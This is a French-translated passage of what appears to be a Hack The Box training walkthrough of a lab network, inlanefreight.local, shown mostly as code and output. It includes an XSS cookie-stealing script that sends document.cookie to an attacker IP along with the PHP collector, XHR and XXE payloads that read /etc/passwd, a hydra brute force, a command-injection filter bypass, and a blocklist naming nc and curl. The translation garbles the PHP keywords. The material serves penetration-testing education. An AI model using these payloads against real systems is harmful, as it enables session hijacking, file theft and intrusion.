système d'exploitation du serveur Web : Linux Ubuntu 20.10 ou 20.04 ou 19.10 (focal ou eoan)
technologie des applications Web : Apache 2.4.41
SGBD back-end : MySQL >= 8.0.0
[00:09:24] [INFO] récupération des noms de base de données
bases de données disponibles [5] :
[*] information_schema
[*] MySQL
[*] schéma_performance
[*] statut
[*] système

[00:09:24] [INFO] a récupéré des données enregistrées dans des fichiers texte sous '/root/.local/share/sqlmap/output/status.inlanefreight.local'

[*] se terminant à 00:09:24 /2022-06-21/

```

En nous concentrant sur la base de données `status` , nous constatons qu'elle ne contient que deux tables :

```
dsgsec@htb[/htb]$ sqlmap -r sqli.txt --dbms=mysql -D status --tables

<SNIP>

---
[00:10:29] [INFO] tester MySQL
[00:10:29] [INFO] confirmant MySQL
[00:10:29] [INFO] le SGBD back-end est MySQL
système d'exploitation du serveur Web : Linux Ubuntu 20.04 ou 19.10 ou 20.10 (eoan ou focal)
technologie des applications Web : Apache 2.4.41
SGBD back-end : MySQL >= 8.0.0
[00:10:29] [INFO] récupération des tables pour la base de données : 'status'
Base de données : état
[2 tableaux]
+---------+
| entreprise |
| utilisateurs |
+---------+

```

À partir de là, nous pourrions essayer de vider toutes les données de la base de données `status` et enregistrer une autre découverte, `SQL Injection`. Essayez ceci manuellement à l'aide du module [SQL Injection Fundamentals](https://academy.hackthebox.com/module/details/33) comme guide et reportez-vous au [SQLMap Essentials](https://academy.hackthebox.com/ module/details/58) module si vous avez besoin d'aide avec l'approche basée sur les outils.

* * * * *

support.inlanefreight.local
---------------------------

Ensuite, nous parcourons le site `http://support.inlanefreight.local` et constatons qu'il s'agit d'un portail d'assistance informatique. Les portails de tickets d'assistance peuvent nous permettre d'interagir avec un utilisateur en direct et peuvent parfois conduire à une attaque côté client où nous pouvons détourner la session d'un utilisateur via une vulnérabilité `Cross-Site Scripting (XSS)` . En parcourant l'application, nous trouvons la page `/ticket.php` où nous pouvons créer un ticket d'assistance. Voyons si nous pouvons déclencher un certain type d'interaction avec l'utilisateur. Remplissez tous les détails d'un ticket et incluez les éléments suivants dans le champ `Message` :

Code : javascript

```
  "><script src=http://10.10.14.15:9000/TESTING_THIS</script>

```

Modifiez l'adresse IP de votre choix et démarrez un écouteur `Netcat` sur le port 9000 (ou sur le port de votre choix). Cliquez sur le bouton `Envoyer` et vérifiez si votre écouteur est rappelé pour confirmer la vulnérabilité.

```
dsgsec@htb[/htb]$ nc -lvnp 9000

écoute sur [tout] 9000 ...
se connecter à [10.10.14.15] depuis (INCONNU) [10.129.203.101] 56202
GET /TESTING_THIS%3C/script HTTP/1.1
Hôte : 10.10.14.15:9000
Connexion : keep-alive
Agent utilisateur : HTBXSS/1.0
Accepter: */*
Référent : http://127.0.0.1/
Accepter-Encodage : gzip, dégonfler
Accepter-Langue : en-US

```

Ceci est un exemple d'attaque de type Blind Cross-Site Scripting (XSS). Nous pouvons passer en revue les méthodes de détection Blind XSS dans le module [Cross-Site Scripting (XSS)](https://academy.hackthebox.com/module/103/section/1008) .

Nous devons maintenant comprendre comment nous pouvons voler le cookie d'un administrateur afin que nous puissions nous connecter et voir quel type d'accès nous pouvons obtenir. Nous pouvons le faire en créant les deux fichiers suivants :

1. index.php

Code : php

```
<?php
si (isset($_GET['c'])) {
     $list = éclater(";", $_GET['c']);
     foreach ($list as $key => $value) {
         $cookie = urldecode($value);
         $fichier = fopen("cookies.txt", "a+");
         fputs($file, "IP de la victime : {$_SERVER['REMOTE_ADDR']} | Cookie : {$cookie}\n");
         fclose($fichier);
     }
}
?>

```

1. script.js

Code : javascript

```
nouvelle Image().src='http://10.10.14.15:9200/index.php?c='+document.cookie

```

Ensuite, démarrez un serveur Web PHP sur votre hôte d'attaque comme suit :

```
sudo php -S 0.0.0.0:9200

```

Enfin, créez un nouveau ticket et soumettez ce qui suit dans le champ message :

Code : javascript

```
"><script src=http://10.10.14.15:9200/script.js></script>

```

Nous recevons un rappel sur notre serveur Web avec un cookie de session d'administrateur :

```
dsgsec@htb[/htb]$ sudo php -S 0.0.0.0:9200

[Mar 21 juin 00:33:27 2022] Le serveur de développement PHP 7.4.28 (http://0.0.0.0:9200) a démarré
[Mar 21 juin 00:33:42 2022] 10.129.203.101:40102 Accepté
[Mar 21 juin 00:33:42 2022] 10.129.203.101:40102 [200] : (null) /script.js
[Mar 21 juin 00:33:42 2022] 10.129.203.101:40102 Fermeture
[Mar 21 juin 00:33:43 2022] 10.129.203.101:40104 Accepté
[Mar 21 juin 00:33:43 2022] 10.129.203.101:40104 [500] : GET /index.php?c=session=fcfaf93ab169bc943b92109f0a845d99

<SNIP>

```

Ensuite, nous pouvons utiliser un plugin Firefox tel que [Cookie-Editor](https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/?utm_source=addons.mozilla.org&utm_medium=referral&utm_content=search ) pour vous connecter à l'aide du cookie de session de l'administrateur.

![texte](https://academy.hackthebox.com/storage/modules/163/edit_cookie.png)

Cliquez sur le bouton Enregistrer pour enregistrer le cookie nommé `session` et cliquez sur `Connexion` en haut à droite. Si tout estfonctionne comme prévu, nous serons redirigés vers `http://support.inlanefreight.local/dashboard.php`. Prenez un peu de temps et enregistrez une autre découverte, `Cross-Site Scripting (XSS)`, en notant que la découverte est à haut risque car elle peut être utilisée pour voler la session d'un administrateur actif et accéder au système de file d'attente de tickets. Consultez le module [Cross-Site Scripting (XSS)](https://academy.hackthebox.com/module/details/103) pour un rappel sur XSS et les différentes manières dont cette classe de vulnérabilités peut être exploitée, y compris le piratage de session.

* * * * *

tracking.inlanefreight.local
-------------------------------------

Le site `http://tracking.inlanefreight.local/` nous permet d'entrer un numéro de suivi et de recevoir un PDF indiquant l'état de notre commande. L'application prend l'entrée de l'utilisateur et génère un document PDF. Lors de la génération du PDF, nous pouvons voir que le champ `Numéro de suivi :` prend n'importe quelle entrée (pas seulement des chiffres) que nous spécifions dans le champ de recherche avant d'appuyer sur le bouton `Suivre maintenant` . Si nous insérons une charge utile JavaScript simple telle que `<script>document.write('TESTING THIS')</script>` et cliquez sur `Track Now`, nous constatons que le PDF est généré et que le message `TESTING THIS` s'affiche. , ce qui semble signifier que le code JavaScript s'exécute lorsque le serveur Web génère le document.

![texte](https://academy.hackthebox.com/storage/modules/163/tracking_rendered.png)

Nous remarquons que nous pouvons également injecter du HTML. Une charge utile simple telle que `<h1>test</h1>` s'affichera également dans le champ `Tracking #:` lors de la génération du PDF. Googler pour quelque chose comme `vulnérabilité d'injection HTML pdf` renvoie plusieurs résultats intéressants tels que [ce message](https://blog.appsecco.com/finding-ssrf-via-html-injection-inside-a-pdf-file- on-aws-ec2-214cc5ec5d90) et [ce message](https://namratha-gm.medium.com/ssrf-to-local-file-read-through-html-injection-in-pdf-file-53711847cb2f) discuter de l'utilisation de l'injection HTML, XSS et SSRF pour la lecture de fichiers locaux. Maintenant, bien que cela ne soit pas couvert dans le `cheminement du rôle de testeur d'intrusion`, il est important de noter que nous rencontrerons souvent de nouvelles choses lors de nos évaluations.

* * * * *

Faire face à l'inattendu
---------------------------

C'est là que l'état d'esprit des testeurs d'intrusion est essentiel. Nous devons être capables de nous adapter, de pousser et de pousser, et de prendre les informations que nous trouvons et d'appliquer notre processus de réflexion pour déterminer ce qui se passe. Après quelques recherches, nous avons pu en déduire que l'application Web génère des rapports PDF, et nous pouvons contrôler l'entrée dans un champ qui ne devrait accepter que des nombres, comme il semble. Grâce à quelques recherches, nous avons pu identifier une classe de vulnérabilité que nous ne connaissons peut-être pas encore, mais il existe une recherche et une documentation considérables à ce sujet. De nombreux chercheurs publient des recherches extrêmement détaillées à partir de leurs propres évaluations ou primes de bogues, et nous pouvons souvent les utiliser comme guide pour essayer de trouver des problèmes similaires. Il n'y a pas deux évaluations identiques, mais il n'y a qu'un nombre limité de piles de technologies d'applications Web possibles, nous sommes donc obligés de voir certaines choses encore et encore, et bientôt les choses qui étaient nouvelles et difficiles deviennent une seconde nature. Il vaut la peine de consulter le module [Attaques côté serveur](https://academy.hackthebox.com/module/145/section/1297) pour en savoir plus sur SSRF et les autres attaques côté serveur.

Examinons certaines de ces descriptions et voyons si nous pouvons produire un résultat similaire et obtenir une lecture de fichier local. Suite à cet [post](https://namratha-gm.medium.com/ssrf-to-local-file-read-through-html-injection-in-pdf-file-53711847cb2f), testons la lecture du fichier local à l'aide [Objets XMLHttpRequest (XHR)](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest) et également en consultant cet [excellent article](https://blog.noob.ninja/local -file-read-via-xss-in-dynamically-generated-pdf/) sur un fichier local lu via XSS dans un PDF généré dynamiquement. Nous pouvons utiliser cette charge utile pour tester la lecture du fichier, en essayant d'abord le fichier `/etc/passwd` , qui est lisible par tous et devrait confirmer l'existence de la vulnérabilité.

Code : javascript

```
<script>
x=new XMLHttpRequest ;
x.onload=fonction(){
document.write(this.responseText)} ;
x.open("GET","file:///etc/passwd");
x.send();
</script>

```

Nous collons la charge utile dans le champ de recherche et appuyons sur le bouton `Track Now` et le nouveau PDF généré nous affiche le contenu du fichier, nous avons donc le fichier local lu !

![texte](https://academy.hackthebox.com/storage/modules/163/ssrf_file_read.png)

Cela vaut la peine de lire ces articles de blog, d'étudier cette découverte et son impact, et de se familiariser avec cette classe de vulnérabilité. Si nous devions rencontrer quelque chose comme ça lors d'un test d'intrusion avec lequel nous ne sommes pas familiers mais qui semblait "hors service", nous pourrions nous référer au [Processus de test d'intrusion](https://academy.hackthebox.com/module/90/section/ 939) pour effectuer une analyse de la situation. Si nous avons fait nos recherches et que nous ne pouvions toujours pas découvrir la vulnérabilité, nous devrions conserver des notes détaillées de ce que nous avons essayé et de notre processus de réflexion et demander de l'aide à nos pairs et aux membres les plus expérimentés de notre équipe. PenteLes meilleures équipes ont souvent des gens qui se spécialisent ou sont plus forts dans certains domaines, donc quelqu'un dans l'équipe a probablement vu cela ou quelque chose de similaire.

Jouez un peu plus avec cette vulnérabilité et voyez à quoi d'autre vous pouvez accéder. Pour l'instant, nous allons noter une autre découverte à haut risque, `SSRF to Local File Read`, et passer à autre chose.

* * * * *

vpn.inlanefreight.local
------------------------

Il est courant de rencontrer un VPN et d'autres portails d'accès à distance lors d'un engagement de test d'intrusion. Cela semble être un portail de connexion Fortinet SSL VPN. Lors des tests, nous avons confirmé que la version utilisée n'était pas vulnérable à des exploits connus. Cela pourrait être un excellent candidat pour la pulvérisation de mot de passe dans un engagement réel, à condition que nous adoptions une approche prudente et mesurée pour éviter le verrouillage du compte.

Nous essayons quelques paires d'informations d'identification courantes/faibles, mais nous obtenons le message d'erreur suivant : `Accès refusé.`, nous pouvons donc passer à l'application suivante.

* * * * *

gitlab.inlanefreight.local
--------------------------

De nombreuses entreprises hébergent leurs propres instances GitLab et parfois ne les verrouillent pas correctement. Comme indiqué dans la section [GitLab - Discovery & Enumeration](https://academy.hackthebox.com/module/113/section/1216) du module `Attaquer les applications courantes` , un administrateur peut mettre en œuvre plusieurs étapes pour limiter l'accès à une instance GitLab telle que :

- Exiger l'approbation de l'administrateur pour les nouvelles inscriptions
- Listes configurées de domaines autorisés pour les inscriptions
- Configuration d'une liste de refus

Parfois, nous rencontrons une instance GitLab qui n'est pas suffisamment sécurisée. Si nous pouvons accéder à une instance GitLab, cela vaut la peine de creuser pour voir quel type de données nous pouvons trouver. Nous pouvons découvrir des fichiers de configuration contenant des mots de passe, des clés SSH ou d'autres informations susceptibles d'améliorer notre accès. Après l'inscription, nous pouvons parcourir `/explorer` pour voir à quels projets, le cas échéant, nous avons accès. Nous pouvons voir que nous pouvons accéder au projet `shopdev2.inlanefreight.local` , qui nous donne un indice sur un autre sous-domaine que nous n'avons pas découvert à l'aide du transfert de zone DNS et que nous n'avons probablement pas pu trouver à l'aide du forçage brutal du sous-domaine.

![texte](https://academy.hackthebox.com/storage/modules/163/gitlab_explore.png)

Avant d'explorer le nouveau sous-domaine, nous pouvons enregistrer une autre découverte à haut risque : `Instance GitLab mal configurée`.

* * * * *

shopdev2.inlanefreight.local
-------------------------------------

Notre énumération de l'instance GitLab a conduit à un autre vhost. Commençons donc par l'ajouter à notre fichier `/etc/hosts` pour pouvoir y accéder. En naviguant sur `http://shopdev2.inlanefreight.local`, nous sommes redirigés vers une page de connexion `/login.php` . Les contournements d'authentification typiques ne nous mènent nulle part, nous revenons donc aux bases du module `Attaquer les applications courantes` [Application Discovery & Enumeration](https://academy.hackthebox.com/module/113/section/1088) section et essayez quelques paires d'informations d'identification faibles. Parfois, ce sont les choses les plus simples qui fonctionnent (et oui, nous voyons ce type de choses en production, à la fois interne ET externe) et peuvent se connecter avec `admin:admin`. Une fois connecté, nous voyons une sorte de boutique en ligne pour acheter des produits en gros. Lorsque nous voyons `dev` dans une URL (en particulier vers l'extérieur), nous pouvons supposer qu'elle n'est pas prête pour la production et qu'elle mérite d'être approfondie, en particulier à cause du commentaire `Processus de paiement non implémenté` au bas de la page.

Nous pouvons tester la recherche de vulnérabilités d'injection et chercher autour des IDOR et autres failles mais ne trouvons rien de particulièrement intéressant. Testons le flux d'achat, en nous concentrant sur le processus de paiement du panier et en capturant les demandes dans Burp Suite. Ajoutez un article ou deux au panier et accédez à `/cart.php` et cliquez sur le bouton `J'ACCEPTE` afin que nous puissions analyser la demande dans Burp. En regardant Burp, nous voyons qu'une requête `POST` est faite avec `XML` dans le corps comme suit :

Code : xml

```
<?xml version="1.0" encoding="UTF-8" ?>
     <racine>
      <sous-total>
       indéfini
      </sous-total>
      <ID utilisateur>
       1206
      </userid>
     </racine>

```

Repensez au contenu du module, à savoir le module [Attaques Web](https://academy.hackthebox.com/module/134/section/1203)   ; cela semble être un bon candidat pour `l'injection d'entité externe XML (XXE)` car le formulaire semble envoyer des données au serveur au format XML. Nous essayons quelques charges utiles et pouvons enfin obtenir une lecture de fichier local pour afficher le contenu du fichier `/etc/passwd` avec cette charge utile :

Code : xml

```
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE ID utilisateur [
   <!ENTITY xxetest SYSTEM "file:///etc/passwd">
]>
<racine>
<sous-total>
indéfini
</sous-total>
<ID utilisateur>
&xxetest;
</userid>
</racine>

```

![texte](https://academy.hackthebox.com/storage/modules/163/xxe_passwd.png)

Inscrivons une autre découverte à haut risque, `Injection d'entité externe XML (XXE)` (nous avons toute la liste jusqu'à présent !), Et passons au dernier vhost/sous-domaine.

* * * * *

monitoring.inlanefreight.local
------------------------------

Nous avons découvert le `monitoring` vhost plus tôt, nous ne reviendrons donc pas◊tourbe le processus. Nous avons utilisé ffuf, mais cette énumération peut également être effectuée avec d'autres outils. Essayez `GoBuster` pour vous familiariser avec plus d'outils. La navigation vers `http://monitoring.inlanefreight.local` entraîne une redirection vers `/login.php`. Nous pouvons essayer des charges utiles de contournement d'authentification et des paires d'informations d'identification faibles courantes, mais nous n'allons nulle part, nous recevons simplement l'erreur "Identifiants non valides !" à chaque fois. Puisqu'il s'agit d'un formulaire de connexion, il vaut la peine d'explorer davantage afin que nous puissions le fuzzer un peu avec Burp Intruder pour voir si nous pouvons provoquer un message d'erreur indiquant une vulnérabilité d'injection SQL, mais nous n'y parvenons pas.

Une analyse de la requête POST et de la réponse dans Burp Suite ne donne rien d'intéressant. À ce stade, nous avons épuisé presque toutes les attaques Web possibles et revenons au contenu du module, en nous souvenant du module [Login Brute Forcing](https://academy.hackthebox.com/module/57/section/503) qui se concentre sur l'outil `hydra`. Cet outil peut être utilisé pour forcer brutalement les formulaires de connexion HTTP, alors essayons. Nous utiliserons la même [liste de mots](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top100.txt) du référentiel GitHub `SecLists` comme précédemment.

Nous allons configurer `hydra` pour effectuer l'attaque par force brute, en spécifiant le message d'erreur `Identifiants invalides !` pour filtrer les tentatives de connexion non valides. Nous obtenons un résultat pour la paire d'informations d'identification `admin:12qwaszx`, un mot de passe commun de "promenade au clavier" facile à mémoriser mais qui peut être très facilement forcé/craqué.

```
dsgsec@htb[/htb]$ hydra -l admin -P ./passwords.txt monitoring.inlanefreight.local http-post-form "/login.php:username=admin&password=^PASS^:Identifiants invalides !"

Hydra v9.1 (c) 2020 par van Hauser/THC & David Maciejak - Veuillez ne pas utiliser dans les organisations militaires ou de services secrets, ou à des fins illégales (ceci n'est pas contraignant, ces *** ignorent de toute façon les lois et l'éthique).

Hydra (https://github.com/vanhauser-thc/thc-hydra) à partir du 2022-06-21 11:32:17
[DONNÉES] max 16 tâches par 1 serveur, 16 tâches au total, 99 tentatives de connexion (l:1/p:99), ~7 tentatives par tâche
[DATA] attaquant http-post-form://monitoring.inlanefreight.local:80/login.php:username=admin&password=^PASS^:Identifiants invalides !
[80][http-post-form] hôte : monitoring.inlanefreight.local identifiant : admin mot de passe : 12qwaszx
1 cible sur 1 complétée avec succès, 1 mot de passe valide trouvé
Hydra (https://github.com/vanhauser-thc/thc-hydra) terminé le 2022-06-21 11:32:22

```

Une fois connecté, on nous présente une sorte de console de surveillance. Si nous tapons `help`, une liste de commandes s'affiche. Cela ressemble à un environnement shell restreint pour effectuer des tâches limitées et quelque chose de très dangereux qui ne devrait pas être exposé à l'extérieur. La dernière classe de vulnérabilités enseignée dans le `Chemin de rôle de testeur de pénétration` que nous n'avons pas encore couvert est [Injections de commandes](https://academy.hackthebox.com/module/details/109).

![texte](https://academy.hackthebox.com/storage/modules/163/monitoring.png)

Nous parcourons chacune des commandes. Essayer `cat /etc/passwd` ne fonctionne pas, il semble donc que nous soyons effectivement dans un environnement restreint. `whoami` et `date` nous fournissent quelques informations de base. Nous ne voulons pas `redémarrer` la cible et provoquer une interruption de service. Nous ne sommes pas en mesure de `cd` vers d'autres répertoires. Taper `ls` nous montre quelques fichiers qui sont probablement stockés dans le répertoire auquel nous sommes actuellement limités.

![texte](https://academy.hackthebox.com/storage/modules/163/monitoring_files.png)

En parcourant les fichiers, nous trouvons un service d'authentification et aussi que nous sommes à l'intérieur d'un conteneur. La dernière option de la liste est `connection_test`. En tapant cela, vous obtenez un message `Success` et rien de plus. En revenant à Burp Suite et en transmettant la requête par proxy, nous constatons qu'une requête `GET` est envoyée à `/ping.php` pour l'adresse IP de l'hôte local `127.0.0.1`, et la réponse HTTP indique une seule attaque ping réussie. Nous pouvons en déduire que le script `/ping.php` exécute une commande d'exploitation à l'aide d'une fonction PHP telle que `shell_exec(ping -c 1 127.0.0.1)` ou peut-être similaire à l'aide de [system()](https:// www.php.net/manual/en/function.system.php) fonction pour exécuter une commande. Si ce script est codé de manière incorrecte, cela pourrait facilement entraîner une vulnérabilité d'injection de commande, alors essayons quelques charges utiles courantes.

Il semble y avoir une sorte de filtrage en place, car essayer des charges utiles standard comme `GET /ping.php?ip=%127.0.0.1;id` et `GET /ping.php?ip=%127.0.0.1|id` résulte en une erreur "Entrée non valide", ce qui signifie qu'il y a probablement une liste noire de personnages en jeu. Nous pouvons contourner ce filtre en utilisant un caractère de saut de ligne `%0A` (ou un caractère de nouvelle ligne) comme opérateur d'injection en suivant la méthodologie décrite dans [Bypassing Space Filters](https://academy.hackthebox.com/module/ 109/section/1036). Nous pouvons faire une demande en ajoutant le caractère de nouvelle ligne comme `GET /ping.php?ip=127.0.0.1%0a`, et le ping réussit toujours, ce qui signifie que le caractère n'est pas sur la liste noire.

Nous avons gagné la première battele, mais il semble y avoir un autre type de filtre en place, car essayer quelque chose comme `GET /ping.php?ip=127.0.0.1%0aid` résulte toujours en une erreur `Invalid input` . Ensuite, nous pouvons jouer avec la syntaxe de la commande et voir que nous pouvons contourner le deuxième filtre en utilisant des guillemets simples. En passant à `cURL`, nous pouvons exécuter la commande `id` comme suit :

```
dsgsec@htb[/htb]$ curl "http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1%0a'i'd"

PING 127.0.0.1 (127.0.0.1) 56(84) octets de données.
64 octets à partir de 127.0.0.1 : icmp_seq=1 ttl=64 time=0,045 ms

--- 127.0.0.1 statistiques de ping ---
1 paquets transmis, 1 reçu, 0% de perte de paquets, temps 0ms
rtt min/moy/max/mdev = 0,045/0,045/0,045/0,000 ms
uid=1004(webdev) gid=1004(webdev) groupes=1004(webdev),4(adm)

```

Nous avons réalisé l'exécution de la commande en tant qu'utilisateur `webdev` . En fouillant un peu plus, nous voyons que cet hôte possède plusieurs adresses IP, dont l'une le place à l'intérieur du réseau `172.16.8.0/23` qui faisait partie de la portée initiale. Si nous pouvons obtenir un accès stable à cet hôte, nous pourrons peut-être pivoter vers le réseau interne et commencer à attaquer le domaine Active Directory.

```
dsgsec@htb[/htb]$ curl "http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1%0a'i'fconfig"

PING 127.0.0.1 (127.0.0.1) 56(84) octets de données.
64 octets à partir de 127.0.0.1 : icmp_seq=1 ttl=64 time=0,048 ms

--- 127.0.0.1 statistiques de ping ---
1 paquets transmis, 1 reçu, 0% de perte de paquets, temps 0ms
rtt min/moy/max/mdev = 0,048/0,048/0,048/0,000 ms

<SNIP>

ens160 : flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500
         inet 10.129.203.101 masque de réseau 255.255.0.0 diffusion 10.129.255.255
         inet6 dead:beef::250:56ff:feb9:67a5 prefixlen 64 scopeid 0x0<global>
         inet6 fe80::250:56ff:feb9:67a5 prefixlen 64 scopeid 0x20<lien>
         ether 00:50:56:b9:67:a5 txqueuelen 1000 (Ethernet)
         Paquets RX 10055 octets 1041358 (1,0 Mo)
         Erreurs de réception 0 abandonnées 0 dépassements 0 trame 0
         Paquets TX 2316 octets 4030180 (4,0 Mo)
         Erreurs TX 0 abandonnées 0 dépassements 0 porteuse 0 collisions 0

ens192 : flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500
         inet 172.16.8.120 masque de réseau 255.255.254.0 diffusion 172.16.255.255
         inet6 fe80::250:56ff:feb9:a62d prefixlen 64 scopeid 0x20<lien>
         ether 00:50:56:b9:a6:2d txqueuelen 1000 (Ethernet)
         Paquets RX 21515 octets 1890242 (1,8 Mo)
         Erreurs de réception 0 abandonnées 0 dépassements 0 trame 0
         Paquets TX 15 octets 1146 (1,1 Ko)
         Erreurs TX 0 abandonnées 0 dépassements 0 porteuse 0 collisions 0

```

Notre prochain défi est de trouver un moyen d'obtenir une coque inversée. Nous pouvons exécuter des commandes uniques, mais tout ce qui contient un espace ne fonctionne pas. De retour à la section [Bypassing Space Filters](https://academy.hackthebox.com/module/109/section/1036) du module `Command Injections` , nous rappelons que nous pouvons utiliser l'environnement Linux `($IFS) Variable` pour contourner les restrictions d'espace. Nous pouvons combiner cela avec le contournement des caractères de nouvelle ligne et commencer à énumérer les moyens d'obtenir un shell inversé. Pour nous aider, examinons le fichier `ping.php` pour comprendre ce qui est filtré afin de limiter la quantité de conjectures nécessaires.

Revenir à Burp et faire la requête `GET /ping.php?ip=127.0.0.1%0a'c'at${IFS}ping.php`, ou similaire, nous donne le contenu du fichier, et nous pouvons travailler à battre le filtre et trouver un moyen d'établir une coque inversée.

Code : php

```
<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
$sortie = '';

filtre de fonction($str)
{
   $opérateurs = ['&', '|', ';', '\\', '/', ' '] ;
   foreach ($opérateurs en tant que $opérateur) {
     si (strpos($str, $opérateur)) {
       retourner vrai ;
     }
   }
   $words = ['whoami', 'echo', 'rm', 'mv', 'cp', 'id', 'curl', 'wget', 'cd', 'sudo', 'mkdir', 'man ', 'history', 'ln', 'grep', 'pwd', 'file', 'find', 'kill', 'ps', 'uname', 'hostname', 'date', 'uptime', 'lsof', 'ifconfig', 'ipconfig', 'ip', 'tail', 'netstat', 'tar', 'apt', 'ssh', 'scp', 'moins', 'plus', 'awk ', 'head', 'sed', 'nc', 'netcat'] ;
   foreach ($mots comme $mot) {
     si (strpos($str, $mot) !== faux) {
       retourner vrai ;
     }
   }

   retourner faux ;
}

si (isset($_GET['ip'])) {
   $ip = $_GET['ip'] ;
   si (filtre($ip)) {
     $output = "Entrée invalide" ;
   } autre {
     $cmd = "bash -c 'ping -c 1 " . $ip . "'" ;
     $sortie = shell_exec($cmd);
   }
}
?>
<?php
echo $sortie ;
?>

```

Nous pouvons voir que la majorité des options pour obtenir un shell inversé sont filtrées, ce qui rendra les choses difficiles, mais celle qui ne l'est pas est `socat`. Socat est un outil polyvalent qui peut être utilisé pour attraper des obus, et même pivoter comme nous l'avons vu dans le module [Pivoting, Tunneling, and Port Forwarding](https://academy.hackthebox.com/module/details/158) . Vérifions et voyons s'il est disponible pour nous sur le système. Revenir à Burp et utiliser la requête `GET /ping.php?ip=127.0.0.1%0a'w'h'i'ch${IFS}socat` nous montre qu'il se trouve sur le système, situé à `/usr /bin/socat`.

![texte](https://academy.hackthebox.com/storage/modules/163/socat_check.png)

* * * * *

Prochaines étapes
----------

Maintenant que nous avons enfin parcouru tous les services et applications Web externes, nous avons une bonne idée de nos prochaines étapes. Dans la section suivante, nous travaillerons à établir un shell inversé dans l'environnement interne et à élever nos privilèges pour établir une sorte de persistance sur l'hôte cible.